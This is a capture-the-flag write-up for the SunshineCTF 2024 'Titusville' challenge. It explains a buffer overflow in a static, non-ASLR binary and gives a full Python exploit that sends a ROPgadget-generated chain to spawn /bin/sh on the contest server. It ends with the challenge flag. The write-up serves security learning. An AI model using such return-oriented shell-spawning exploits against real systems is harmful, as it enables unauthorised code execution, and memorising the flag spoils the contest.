# Titusville
> ### Category: I-95
>
> Maybe just go the other way at the exit and go to Orlando instead :D
>
> `nc 2024.sunshinectf.games 24607`
>
> ### Attachments
> `titusville`

## Solution
The attachment is a binary without ASLR with statically-linked libc. It is however missing functions like `system` or `execve`. An easy way to solve it is to run `$ ROPgadget --binary titusville --ropchain` to generate a ROP chain that uses a syscall to execute /bin/sh.

## Script
```py
from gdb_plus import *
from struct import pack

FILENAME = './titusville'
PORT = 24607

e = ELF(FILENAME)

dbg = Debugger(FILENAME, script='init-gef').remote('2024.sunshinectf.games', PORT)

io = dbg.p

dbg.c(wait=False)

# ROPgadget --binary titusville --ropchain
p = b''
p += pack('<Q', 0x0000000000409f6e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000448127) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a5a5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000409f6e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043d310) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044a5a5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401eff) # pop rdi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000409f6e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000047f2ab) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x000000000043d310) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471310) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401cb4) # syscall

payload = b'A' * 128 + b'B' * 8 + p

io.sendlineafter(b'!\n', payload)

io.interactive()
```

## Flag
`sun{Wow this dragon has a super cool sword. Although it's a bit heavy, and doesn't seem to like us :(}`